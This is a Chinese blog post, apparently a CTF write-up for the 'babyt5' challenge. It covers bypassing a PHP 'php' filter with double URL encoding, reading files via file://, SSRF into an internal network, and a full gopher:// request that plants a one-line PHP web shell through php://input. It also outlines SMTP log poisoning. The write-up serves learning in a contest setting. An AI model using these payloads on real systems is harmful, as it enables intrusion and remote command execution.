@@ -1,0 +1,555 @@
+<!DOCTYPE html>
+<html lang="zh-Hans">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 6.0.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"blog.z3ratu1.cn","root":"/","scheme":"Pisces","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"always","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+  </script>
+
+  <meta name="description" content="babyt5 wp今天在做什么第五届上海大学生网络安全大赛的一道题，好像是安恒月赛的一道题，感觉题目问题也挺大，有机会自己搭环境搞一搞，对着wp复现了一遍 二次编码绕过&lt;?php highlight_file(__FILE__); $x &#x3D; $_GET[&#39;x&#39;]; $pos &#x3D; strpos($x,&quot;php&quot;); if($pos){         exit(&quot;denied&quot;); } $ch">
+<meta property="og:type" content="article">
+<meta property="og:title" content="babyt5">
+<meta property="og:url" content="https://blog.z3ratu1.cn/babyt5.html">
+<meta property="og:site_name" content="Z3ratu1&#39;s blog">
+<meta property="og:description" content="babyt5 wp今天在做什么第五届上海大学生网络安全大赛的一道题，好像是安恒月赛的一道题，感觉题目问题也挺大，有机会自己搭环境搞一搞，对着wp复现了一遍 二次编码绕过&lt;?php highlight_file(__FILE__); $x &#x3D; $_GET[&#39;x&#39;]; $pos &#x3D; strpos($x,&quot;php&quot;); if($pos){         exit(&quot;denied&quot;); } $ch">
+<meta property="og:locale">
+<meta property="article:published_time" content="2019-11-03T06:49:00.000Z">
+<meta property="article:modified_time" content="2020-07-12T08:33:48.495Z">
+<meta property="article:author" content="Z3ratu1">
+<meta property="article:tag" content="php">
+<meta property="article:tag" content="文件包含">
+<meta property="article:tag" content="gopher">
+<meta property="article:tag" content="SSRF">
+<meta name="twitter:card" content="summary">
+
+<link rel="canonical" href="https://blog.z3ratu1.cn/babyt5.html">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-Hans'
+  };
+</script>
+
+  <title>babyt5 | Z3ratu1's blog</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+<link rel="stylesheet" href="/css/prism-tomorrow.css" type="text/css"></head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">Z3ratu1's blog</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+      <p class="site-subtitle" itemprop="description">Welcome</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+        <li class="menu-item menu-item-links">
+
+    <a href="/links/" rel="section"><i class="fa fa-link fa-fw"></i>友链</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off" placeholder="搜索..." spellcheck="false" type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result">
+  <div id="no-result">
+    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+  <a href="https://github.com/Z3ratu1" class="github-corner" title="Follow me on GitHub" aria-label="Follow me on GitHub" rel="external nofollow noopener noreferrer" target="_blank"><svg width="80" height="80" viewbox="0 0 250 250" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"/><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"/><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"/></svg></a>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-Hans">
+    <link itemprop="mainEntityOfPage" href="https://blog.z3ratu1.cn/babyt5.html">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="https://q2.qlogo.cn/headimg_dl?dst_uin=1207039417&spec=160">
+      <meta itemprop="name" content="Z3ratu1">
+      <meta itemprop="description" content="与其感慨路难行，不如现在出发">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Z3ratu1's blog">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          babyt5
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2019-11-03 14:49:00" itemprop="dateCreated datePublished" datetime="2019-11-03T14:49:00+08:00">2019-11-03</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2020-07-12 16:33:48" itemprop="dateModified" datetime="2020-07-12T16:33:48+08:00">2020-07-12</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/" itemprop="url" rel="index"><span itemprop="name">刷题记录</span></a>
+                </span>
+            </span>
+
+          
+            <span id="/babyt5.html" class="post-meta-item leancloud_visitors" data-flag-title="babyt5" title="阅读次数">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">阅读次数：</span>
+              <span class="leancloud-visitors-count"></span>
+            </span>
+  
+  <span class="post-meta-item">
+    
+      <span class="post-meta-item-icon">
+        <i class="far fa-comment"></i>
+      </span>
+      <span class="post-meta-item-text">Valine：</span>
+    
+    <a title="valine" href="/babyt5.html#valine-comments" itemprop="discussionUrl">
+      <span class="post-comments-count valine-comment-count" data-xid="/babyt5.html" itemprop="commentCount"></span>
+    </a>
+  </span>
+  
+  
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h1 id="babyt5-wp"><a href="#babyt5-wp" class="headerlink" title="babyt5 wp"></a>babyt5 wp</h1><p>今天在做什么第五届上海大学生网络安全大赛的一道题，好像是安恒月赛的一道题，感觉题目问题也挺大，有机会自己搭环境搞一搞，对着wp复现了一遍</p>
+<h2 id="二次编码绕过"><a href="#二次编码绕过" class="headerlink" title="二次编码绕过"></a>二次编码绕过</h2><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
+<span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token variable">$x</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'x'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+<span class="token variable">$pos</span> <span class="token operator">=</span> <span class="token function">strpos</span><span class="token punctuation">(</span><span class="token variable">$x</span><span class="token punctuation">,</span><span class="token string">"php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$pos</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
+        <span class="token function">exit</span><span class="token punctuation">(</span><span class="token string">"denied"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span>
+<span class="token variable">$ch</span> <span class="token operator">=</span> <span class="token function">curl_init</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">,</span><span class="token constant">CURLOPT_URL</span><span class="token punctuation">,</span><span class="token string">"$x"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">,</span><span class="token constant">CURLOPT_RETURNTRANSFER</span><span class="token punctuation">,</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token variable">$result</span> <span class="token operator">=</span> <span class="token function">curl_exec</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token keyword">echo</span> <span class="token variable">$result</span><span class="token punctuation">;</span>
+</code></pre>
+<p>首先得想办法对strpos进行绕过，按常理来说我们如果把php放在最前面就可以绕过个strpos函数，但是curl不支持PHP伪协议(可用curl –version查看支持的协议)，于是出现了这个二次编码绕过<br>用%2570代替p即可绕过对于strpos的检验，详见<a target="_blank" rel="external nofollow noopener noreferrer" href="https://bugs.php.net/bug.php?id=76671&amp;edit=1">https://bugs.php.net/bug.php?id=76671&amp;edit=1</a><br>事实上个人感觉是数据发送到服务器端进行第一次解码，而curl发起第二次请求时进行了第二次的解码，也就意味着这并不是strpos的问题，而是一个来自二次编码绕过的问题</p>
+<h2 id="file-x2F-x2F-读文件"><a href="#file-x2F-x2F-读文件" class="headerlink" title="file:&#x2F;&#x2F;读文件"></a>file:&#x2F;&#x2F;读文件</h2><p>有了curl，可以用file:&#x2F;&#x2F;协议申请本地文件，读了index.php之后试着读了一下flag.php，结果flag.php里面只有一个提示说要读&#x2F;etc&#x2F;hosts<br>说实话一开始不知道这个是个什么文件，但是里面有一个很明显的ip地址172.18.0.3，马师傅说是内网地址QWQ<br>菜了，这样子curl肯定就是以SSRF的形式去打内网了</p>
+<h2 id="SSRF攻击内网服务器"><a href="#SSRF攻击内网服务器" class="headerlink" title="SSRF攻击内网服务器"></a>SSRF攻击内网服务器</h2><p>首先是扫网段，发现172.18.0.1|2都是可以访问的，172.18.0.3就是本机，并且在访问172.18.0.2发现在注释中出现了一个<code>include $_GET[&#39;a&#39;]</code>，进入文件包含阶段<br>包含的时候一开始我智障操作了一波&amp;a&#x3D;xxxx，这里我们是以curl的get请求请求到内网服务器上去的，使用我们的a应该是跟在对内网的请求url上的一个参数，即以?a&#x3D;xxxx的形式进行请求，实在是太菜了才会犯的低级错误，记下来</p>
+<h2 id="gopher伪协议"><a href="#gopher伪协议" class="headerlink" title="gopher伪协议"></a>gopher伪协议</h2><p>本来按道理来说绕来绕去该直接拿flag了，我们完全有理由认为flag就位于内网ip为127.18.0.3的这台服务器上，然而这个服务器上没得flag.php，不会做了</p>
+<p>注意一点，这个时候我们这里curl只能进行一个get请求，无法进行更多的操作<br>因此这个时候就需要用gopher伪协议，gopher伪协议就是可以让我们把伪协议输入的内容作为一个完整的包，自由控制包的内容进而getshell，在对内网只能进行简单访问的时候通过这个伪协议就可以对内网进行任意的请求，自由翱翔于内网<br>接下来是马师傅的想法：比如这里我们对x使用gopher伪协议，发一个post的包。<br>在这个post的包中我们的参数x就是对内网中172.18.0.2服务器的访问，而a则是php:&#x2F;&#x2F;input伪协议，这样子文件包含就会包含我们post的内容，我们用input写一个一句话，然后紧接着把后门密码补上访问一波就可以了。<br>注意包构造时换号要以%0d%0a代替，然后空格什么的也要url编码一下<br>样例包如下<br>注意gopher使用格式为<code>gopher:/ip:port/_ + payload</code>第一次用没加ip和端口我是真的傻</p>
+<pre><code>GET /?x=gopher://172.18.0.2:80/_POST%20/?x%3dhttp://172.18.0.2:80?a%3dph%2570://input%26b=ls%20HTTP/1.1%0d%0aHost:%2047.104.170.59:7302%0d%0aContent-Length:%2030%0d%0a%0d%0a&lt;?ph%2570%20system($_GET[&#39;b&#39;]);%20?&gt; HTTP/1.1
+Host: 47.104.170.59:7302
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:70.0) Gecko/20100101 Firefox/70.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+Connection: close
+Upgrade-Insecure-Requests: 1
+Cache-Control: max-age=0
+
+</code></pre>
+<p>打过去一开始400，后来改了改没有400了，但是也没有回显，可能是b那里不知道url编码把&amp;改成%26之后包发过去还解不解析，不改的话这个包就会认为b是另一个参数，更加没戏</p>
+<h2 id="gopher攻击stmp邮件服务"><a href="#gopher攻击stmp邮件服务" class="headerlink" title="gopher攻击stmp邮件服务"></a>gopher攻击stmp邮件服务</h2><p>wp的思路，除了扫网段还扫了端口，发现25端口还开了一个邮件服务，所以就得那gopher对stmp服务配合文件包含发起攻击了<br>有现成的工具:<a target="_blank" rel="external nofollow noopener noreferrer" href="https://github.com/tarunkant/Gopherus">https://github.com/tarunkant/Gopherus</a> 自动生成包，里面用法也都写下来了，思路就是对其发送一个内容带有shell的包，然后包乱写肯定会有问题，就会进入到其日志中去，然后我们通过猜测默认日志路径找到日志文件，进行对目录文件进行包含，被包含的文件会作为php代码执行，这样子日志中的那一句shell就可以用了，但是这道题题目感觉是有问题的，日志里面已经可以读到shell了，但是执行还是不给执行，我看的wp里也说环境出了问题，最后权且是对着wp里的flag路径读了一波读出来的，有点无奈。</p>
+<h2 id="后记1"><a href="#后记1" class="headerlink" title="后记1"></a>后记1</h2><p>对于什么时候用什么协议感觉我有时候人还是傻傻的，注意curl支持的协议有http(s),gopher,file等，file只能读本地文件，但是不能使用PHP伪协议，就不能使用php:&#x2F;&#x2F;filter进行编码读取，这样子读取php文件时&lt;&gt;会被浏览器认为是注释，需要查看源码才能看见。<br>而使用文件包含时则可以使用input,filter等php伪协议，进行写入文件包含、源码读取等操作，如果是其他类型的文件好像直接填写路径就包含进来可以直接看了(其实也不是太懂，昨天读日志的时候不能要先编码再读，不然读不到，今天本地测试的时候又直接读出来了？)总之实在不行全都编码解码问题不大</p>
+<h2 id="参考的wp"><a href="#参考的wp" class="headerlink" title="参考的wp"></a>参考的wp</h2><p><a target="_blank" rel="external nofollow noopener noreferrer" href="https://www.jianshu.com/p/804d95f6d6fb">https://www.jianshu.com/p/804d95f6d6fb</a></p>
+<h2 id="后记2"><a href="#后记2" class="headerlink" title="后记2"></a>后记2</h2><p>重新学习了一遍gopher，解决一些问题<br>首先gopher使用方式要记牢，不要漏了<br><code>gopher://ip:port/_内容</code>要加ip和端口，并且内容前面要加一个下划线</p>
+<h3 id="二次编码"><a href="#二次编码" class="headerlink" title="二次编码"></a>二次编码</h3><p>gopher发包内容是需要二次编码的，一次编码在发过去的时候会在服务器进行解码，但是gopher还会再进行一次请求，这次请求会在服务器再进行一次解码，不编码可能导致请求中一些特殊字符影响执行，因此需要二次编码<br>但是需要注意，平常需要编码的数据进行二次编码，比如空格<br>而本身具有特殊意义的字符如&amp;&#x3D;?等则只需一次编码即可</p>
+<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a target="_blank" rel="external nofollow noopener noreferrer" href="https://blog.csdn.net/qq_44632668/article/details/102631585">https://blog.csdn.net/qq_44632668/article/details/102631585</a></p>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/php/" rel="tag"># php</a>
+              <a href="/tags/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/" rel="tag"># 文件包含</a>
+              <a href="/tags/gopher/" rel="tag"># gopher</a>
+              <a href="/tags/SSRF/" rel="tag"># SSRF</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/bestphp's%20revenge.html" rel="prev" title="LCTF bestphp's revenge">
+      <i class="fa fa-chevron-left"></i> LCTF bestphp's revenge
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/%E6%97%A0%E5%8F%82%E6%95%B0RCE.html" rel="next" title="无参数RCE">
+      无参数RCE <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+    <div class="comments" id="valine-comments"></div>
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#babyt5-wp"><span class="nav-number">1.</span> <span class="nav-text">babyt5 wp</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BA%8C%E6%AC%A1%E7%BC%96%E7%A0%81%E7%BB%95%E8%BF%87"><span class="nav-number">1.1.</span> <span class="nav-text">二次编码绕过</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#file-x2F-x2F-%E8%AF%BB%E6%96%87%E4%BB%B6"><span class="nav-number">1.2.</span> <span class="nav-text">file:&#x2F;&#x2F;读文件</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#SSRF%E6%94%BB%E5%87%BB%E5%86%85%E7%BD%91%E6%9C%8D%E5%8A%A1%E5%99%A8"><span class="nav-number">1.3.</span> <span class="nav-text">SSRF攻击内网服务器</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#gopher%E4%BC%AA%E5%8D%8F%E8%AE%AE"><span class="nav-number">1.4.</span> <span class="nav-text">gopher伪协议</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#gopher%E6%94%BB%E5%87%BBstmp%E9%82%AE%E4%BB%B6%E6%9C%8D%E5%8A%A1"><span class="nav-number">1.5.</span> <span class="nav-text">gopher攻击stmp邮件服务</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%90%8E%E8%AE%B01"><span class="nav-number">1.6.</span> <span class="nav-text">后记1</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8F%82%E8%80%83%E7%9A%84wp"><span class="nav-number">1.7.</span> <span class="nav-text">参考的wp</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%90%8E%E8%AE%B02"><span class="nav-number">1.8.</span> <span class="nav-text">后记2</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BA%8C%E6%AC%A1%E7%BC%96%E7%A0%81"><span class="nav-number">1.8.1.</span> <span class="nav-text">二次编码</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8F%82%E8%80%83"><span class="nav-number">1.9.</span> <span class="nav-text">参考</span></a></li></ol></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="Z3ratu1" src="https://q2.qlogo.cn/headimg_dl?dst_uin=1207039417&spec=160">
+  <p class="site-author-name" itemprop="name">Z3ratu1</p>
+  <div class="site-description" itemprop="description">与其感慨路难行，不如现在出发</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">145</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">5</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">86</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+  <div class="beian"><a href="http://www.beian.miit.gov.cn/" rel="external nofollow noopener noreferrer" target="_blank">湘ICP备2020021580号 </a>
+      <img src="/./images/beian.png" style="display: inline-block;">
+  </div>
+
+<div class="copyright">
+  
+  &copy; 2019 – 
+  <span itemprop="copyrightYear">2022</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Z3ratu1</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="external nofollow noopener noreferrer" target="_blank">Hexo</a> & <a href="https://pisces.theme-next.org/" class="theme-link" rel="external nofollow noopener noreferrer" target="_blank">NexT.Pisces</a> 强力驱动
+  </div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+  
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+
+<script>
+NexT.utils.loadComments(document.querySelector('#valine-comments'), () => {
+  NexT.utils.getScript('https://cdn.jsdelivr.net/npm/valine@1.4.14/dist/Valine.min.js', () => {
+    var GUEST = ['nick', 'mail', 'link'];
+    var guest = 'nick,mail,link';
+    guest = guest.split(',').filter(item => {
+      return GUEST.includes(item);
+    });
+    new Valine({
+      el         : '#valine-comments',
+      verify     : false,
+      notify     : false,
+      appId      : '7H8kg0XdWO8IbhOcu4K1JaAT-gzGzoHsz',
+      appKey     : 'wPKQjkbVtvPaRR7gh2yjfLSi',
+      placeholder: "Just go go",
+      avatar     : 'mm',
+      meta       : guest,
+      pageSize   : '10' || 10,
+      visitor    : true,
+      lang       : '' || 'zh-cn',
+      path       : location.pathname,
+      recordIP   : false,
+      serverURLs : ''
+    });
+  }, window.Valine);
+});
+</script>
+
+</body>
+</html>
